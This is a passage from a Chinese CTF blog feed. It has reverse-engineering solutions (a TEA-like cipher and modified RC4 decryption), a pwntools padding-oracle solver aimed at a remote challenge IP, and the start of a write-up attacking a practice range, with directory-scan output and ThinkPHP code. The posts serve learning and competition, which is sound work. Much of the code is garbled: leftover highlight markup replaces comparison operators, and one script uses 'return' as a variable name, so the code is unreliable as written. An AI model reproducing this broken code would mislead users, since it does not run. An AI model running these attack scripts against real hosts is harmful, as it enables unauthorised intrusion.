class="hljs-string">&#x27;]&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;:&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;/span&gt; <span class="hljs-string">&#x27;A&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">34</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;E&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[36] &lt;/span&gt; &#x27;&gt;&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">35</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;A&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">36</span>] &lt;/span&gt; <span class="hljs-string">&#x27;!&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">36</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;#&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">37</span>] &lt;/span&gt; <span class="hljs-string">&#x27;+&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">38</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">38</span>] &lt;/span&gt; <span class="hljs-string">&#x27;`&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">39</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;(&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">40</span>] &lt;/span&gt; <span class="hljs-string">&#x27;d&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">41</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;(&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">42</span>] &lt;/span&gt; <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">42</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">42</span>] &lt;/span&gt; <span class="hljs-string">&#x27;D&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">44</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">46</span>] &lt;/span&gt; <span class="hljs-string">&#x27;G&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[46] == &#x27;~&#x27;)continue;</span><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> j;<br>&#125;;<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="BabyCPP"><a href="#BabyCPP" class="headerlink" title="BabyCPP"></a>BabyCPP</h3><p>‍</p><p>线性反馈移位寄存器生成伪随机数+魔改RC4</p><p>通过IDA反编译看到对输入有两个加密，对于密码明文一个加密</p><p>第一个是线性反馈移位寄存器生成伪随机数</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020883.jpg" alt="img">​</p><p>通过动态调试之后还原了加密代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> keys[] = &#123;<span class="hljs-number">0x67452301</span>,<span class="hljs-number">0xEFCDAB89</span>,<span class="hljs-number">0x98BADCFE</span>,<span class="hljs-number">0x10325476</span>&#125;;<br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k = <span class="hljs-number">0xDEADBEEF</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cum = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1 = <span class="hljs-number">0x34333231</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2 = <span class="hljs-number">0x38373635</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">256</span>;i++)&#123;<br><br>key = keys[cum &amp; <span class="hljs-number">3</span>];<br><br>v1 = ((((v2&gt;&gt;<span class="hljs-number">7</span>)^(v2&lt;&lt;<span class="hljs-number">2</span>))+v2)^(key+cum))+v1;<br><br>  key = keys[(cum &gt;&gt; <span class="hljs-number">0xB</span>) &amp; <span class="hljs-number">3</span>];<br><br>v2 = ((((v1&gt;&gt;<span class="hljs-number">3</span>)^(v1&lt;&lt;<span class="hljs-number">6</span>))+v1)^(key+cum))+v2;<br><br>cum = cum + k;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Keys和k是在进入函数前赋的值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020188.jpg" alt="img">​</p><p>通过该加密函数可以推导出解密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2)</span>&#123;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> keys[] = &#123;<span class="hljs-number">0x67452301</span>,<span class="hljs-number">0xEFCDAB89</span>,<span class="hljs-number">0x98BADCFE</span>,<span class="hljs-number">0x10325476</span>&#125;;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cum = <span class="hljs-number">0xadbeef00</span>;<br><br>  <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k = <span class="hljs-number">0xDEADBEEF</span>;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">256</span>;i++)&#123;<br><br>    cum = cum - k;<br><br>    key = keys[(cum &gt;&gt; <span class="hljs-number">0xB</span>) &amp; <span class="hljs-number">3</span>];<br><br>    v2 = v2 - ((((v1&gt;&gt;<span class="hljs-number">3</span>)^(v1&lt;&lt;<span class="hljs-number">6</span>))+v1)^(key+cum));<br><br>    key = keys[cum &amp; <span class="hljs-number">3</span>];<br><br>    v1 = v1 - ((((v2&gt;&gt;<span class="hljs-number">7</span>)^(v2&lt;&lt;<span class="hljs-number">2</span>))+v2)^(key+cum));<br><br>  &#125;<br><br>  <span class="hljs-comment">// printf(&quot;decrypt:v1=0x%x,v2=0x%x\n&quot;,v1,v2);</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x,0x%x,&quot;</span>,v1,v2);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>在验证前还有第二轮魔改rc4加密</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020329.jpg" alt="img">​</p><p>从此处大概还原了加密代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> j in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">48</span>)</span>:<br><br>  i+=<span class="hljs-number">1</span><br><br>  v1 = (v1 + (s_box[i] % <span class="hljs-number">0x100</span>)) % <span class="hljs-number">0x100</span><br><br>  s_box[i], s_box[v1] = s_box[v1], s_box[i]<br><br>  v2 = (s_box[i] + s_box[v1]) % <span class="hljs-number">0x100</span><br><br>plaintext[j] = (((s_box[v2]) ^ plaintext[j]) + s_box[i] ^ s_box[v1]) % <span class="hljs-number">0x100</span><br></code></pre></td></tr></table></figure><p>很显然是魔改的RC4，同时我们从内存中获取RC4初始化后的S盒</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020499.jpg" alt="img">​</p><p>我们可以利用该S盒写出解密代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> j in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">48</span>)</span>:<br><br>    i+=<span class="hljs-number">1</span><br><br>    v1 = (v1 + (s_box[i] % <span class="hljs-number">0x100</span>)) % <span class="hljs-number">0x100</span><br><br>    s_box[i], s_box[v1] = s_box[v1], s_box[i]<br><br>    v2 = (s_box[i] + s_box[v1]) % <span class="hljs-number">0x100</span><br><br>    plaintext[j] ^= s_box[v1]<br><br>    plaintext[j] = (plaintext[j] + <span class="hljs-number">0x100</span> - s_box[i]) % <span class="hljs-number">0x100</span><br><br>    plaintext[j] = ((s_box[v2]) ^ plaintext[j])<br></code></pre></td></tr></table></figure><p>再利用动态调试获取到最后的密文放入解密代码中</p><p>画红色框处是对密文进行魔改RC4解密</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020657.jpg" alt="img">​</p><p>把RC4解密后的密文再放入另一个解密函数中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020813.jpg" alt="img">​</p><p>由于是小端序组成的值，我们还需要对此处理然后转化为flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020969.jpg" alt="img">​</p><p>最后获得flag</p><p>df8d8ab87c22a396041f9bde6a40c4987c22a396041f9bde</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020113.jpg" alt="img">​</p><p>‍</p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><p>‍</p><h3 id="Cyan-1"><a href="#Cyan-1" class="headerlink" title="Cyan-1"></a>Cyan-1</h3><p>‍</p><p>谷歌找到文章</p><p><a href="https://zh.moegirl.org.cn/zh-hk/%E8%B5%9B%E5%B0%8F%E7%9B%90">https://zh.moegirl.org.cn/zh-hk/%E8%B5%9B%E5%B0%8F%E7%9B%90</a></p><p>看着写就行</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020270.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020643.png" alt="image">​</p><p>恭喜您通过考试！ DASCTF1{3ac9edfef8f89edd768ae839f3488c46}</p><p>DASCTF{93071110885044812621524662463525}</p><p>‍</p><p>‍</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>‍</p><h3 id="Or2cle"><a href="#Or2cle" class="headerlink" title="Or2cle"></a>Or2cle</h3><p>‍</p><p>‍过proof，跑了几个数据进行搜索</p><p><a href="https://oeis.org/">https://oeis.org/</a></p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020783.png" alt="img">​</p><p>查询发现，计算a(n)&#x3D;binomial(n,14)即可过proof</p><p>‍</p><p>‍题目是aes ctr模式，padding oracle attack，密文长度是42，</p><p>根据规则可得，原本密文长度为40，2个字节的pad，pad 为b’ \x02’</p><p>‍</p><p>‍</p><p>明文和密文已知的情况下获取密钥，得到密钥之后就可以解密密文得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,bytes_to_long<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256 <br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-comment">#--------------------setting context---------------------</span><br>context.clear(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>li = <span class="hljs-keyword">lambda</span> content,data : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + content + <span class="hljs-string">&#x27; = &#x27;</span> + <span class="hljs-built_in">hex</span>(data) + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>lg = <span class="hljs-keyword">lambda</span> content : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + content +<span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>sla = <span class="hljs-keyword">lambda</span> data, content: io.sendlineafter(data,content)<br>sa = <span class="hljs-keyword">lambda</span> data, content: io.sendafter(data,content)<br>sl = <span class="hljs-keyword">lambda</span> data: io.sendline(data)<br>rl = <span class="hljs-keyword">lambda</span> data: io.recvuntil(data)<br>re = <span class="hljs-keyword">lambda</span> data: io.recv(data)<br>sa = <span class="hljs-keyword">lambda</span> data, content: io.sendafter(data,content)<br>dbg = <span class="hljs-keyword">lambda</span>    : gdb.attach(io)<br>bk = <span class="hljs-keyword">lambda</span> : (dbg(),pause())<br>inter = <span class="hljs-keyword">lambda</span>: io.interactive()<br>l64 = <span class="hljs-keyword">lambda</span>    :u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>h64=<span class="hljs-keyword">lambda</span>     :u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>add=<span class="hljs-number">0</span><br>orw_shellcode = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>) + shellcraft.read(<span class="hljs-number">3</span>, add, <span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>,add, <span class="hljs-number">0x30</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">c = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span>(c):<br>        gdb.attach(io, c)<br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(io)<br>        pause()<br><span class="hljs-comment">#---------------------------------------------------------</span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;/home/ly/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="hljs-comment">#libc=ELF(&quot;/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;)</span><br>filename = <span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment">#io = process(filename)</span><br>io =remote(<span class="hljs-string">&quot;1.14.108.193&quot;</span>,<span class="hljs-string">&quot;31132&quot;</span>) <br>elf = ELF(filename)<br><span class="hljs-comment">#---------------------------------------------------------</span><br>strings = <span class="hljs-string">&quot;DASCTF&#123;&#125;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_combination</span>(<span class="hljs-params">n, k</span>):<br>    <span class="hljs-keyword">if</span> k &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> k &gt; n:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> k &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> k &lt;/span&gt; n:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    k = <span class="hljs-built_in">min</span>(k, n - k)<br>    result = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>        result = result * (n - i) // (i + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> result<br>flag = <span class="hljs-string">&quot;&quot;</span> <br>n = u32(rl(<span class="hljs-string">&quot;s : &quot;</span>).strip().split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])<br>rl(<span class="hljs-string">&quot;hash:&quot;</span>) <br>sl(<span class="hljs-built_in">str</span>(sha256(<span class="hljs-built_in">str</span>(calculate_combination(n+<span class="hljs-number">13</span>, <span class="hljs-number">14</span>)).encode()).hexdigest()))<br><span class="hljs-comment">#过proof</span><br>rl(<span class="hljs-string">b&quot;it\n&quot;</span>) <br>sl(<span class="hljs-string">b&quot;1&quot;</span>) <br>a = rl(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>).decode().split(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>)[<span class="hljs-number">0</span>][-<span class="hljs-number">32</span>:]<br><span class="hljs-comment">#lg(a)</span><br>after64 = b64decode(a) <br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">42</span>): <br>    <span class="hljs-keyword">if</span> index &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-number">16</span> <span class="hljs-keyword">or</span> index &lt;/span&gt; <span class="hljs-number">32</span>: <br>        <span class="hljs-keyword">continue</span> <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings: <br>        rl(<span class="hljs-string">&quot;t\n&quot;</span>) <br>        sl(<span class="hljs-string">b&quot;2&quot;</span>) <br>        tmp_char = <span class="hljs-built_in">chr</span>(after64[index] ^ <span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-number">2</span>)<br>        modified_tmp = after64[:index] + tmp_char.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>) + after64[index+<span class="hljs-number">1</span>:]<br>        sl(modified_tmp) <br>        rl(<span class="hljs-string">&quot;Dec&quot;</span>) <br>        <span class="hljs-keyword">return</span> = sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>).decode().splitlines()[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;faild&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">return</span>: <span class="hljs-comment">#失败就继续</span><br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]&quot;</span>,a)<br>        flag += i <br>        <span class="hljs-keyword">break</span> <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020001.png" alt="image-20240131141132152">​</p><p>得到flag</p><p>DASCTF{771128198258295514986624D2445186}</p><p>d用数字替换</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - 暗月年终靶场</title>
    <link href="/post/target-dark-moon-year-end-shooting-range-z1krwjl.html"/>
    <url>/post/target-dark-moon-year-end-shooting-range-z1krwjl.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我不是什么AY大弟子，我只是个只会自学找大佬带带的弟弟罢了，最近刚好好久没打靶了，于是看到暗月的年终靶场(结束后)迅速去打了一下，本人只拿到了两个flag，很难受，AY学生太多了各种挤来挤去难受坏了真的，不过还是可以称赞下AY的，AY的搭建靶场还是有点东西的，但建议下次可以提高审计难度和漏洞利用实际贴合性，以及服务器质量吧或者限时一下，几百个人日一个服务器，3389咋进啊。。。。</p><p>‍</p><h1 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h1><p>‍</p><h2 id="103-164-63-172"><a href="#103-164-63-172" class="headerlink" title="103.164.63.172"></a>103.164.63.172</h2><p>‍</p><h3 id="8081"><a href="#8081" class="headerlink" title="8081"></a>8081</h3><p>‍</p><p>扫了一下目录得到结果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml">[19:45:00] 200 -   39B  - /.gitignore<br>[19:45:06] 200 -    2KB - /.travis.yml<br>[19:45:29] 301 -  329B  - /application  -&gt;  http://103.164.63.172:8081/application/<br>[19:45:29] 200 -  597B  - /application/<br>[19:45:36] 200 -   49KB - /CHANGELOG.md<br>[19:45:38] 200 -  693B  - /composer.json<br>[19:45:38] 200 -   18KB - /composer.lock<br>[19:46:03] 200 -    1KB - /LICENSE.txt<br>[19:46:23] 301 -  324B  - /public  -&gt;  http://103.164.63.172:8081/public/<br>[19:46:23] 200 -  440B  - /public/<br>[19:46:23] 200 -    6KB - /README.md<br>[19:46:42] 200 -  530B  - /vendor/<br>[19:46:42] 200 -    0B  - /vendor/autoload.php<br>[19:46:42] 200 -    0B  - /vendor/composer/autoload_classmap.php<br>[19:46:42] 200 -    0B  - /vendor/composer/autoload_files.php<br>[19:46:42] 200 -    0B  - /vendor/composer/autoload_psr4.php<br>[19:46:42] 200 -    0B  - /vendor/composer/autoload_namespaces.php<br>[19:46:42] 200 -    1KB - /vendor/composer/LICENSE<br>[19:46:43] 200 -   16KB - /vendor/composer/installed.json<br>[19:46:43] 200 -    0B  - /vendor/composer/autoload_static.php<br>[19:46:43] 200 -    0B  - /vendor/composer/autoload_real.php<br>[19:46:43] 200 -    0B  - /vendor/composer/ClassLoader.php<br></code></pre></td></tr></table></figure><p>发现是TP框架，并且直接访问public得到如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Cache</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>  <br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">geturl</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$url</span>= <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">param</span>(<span 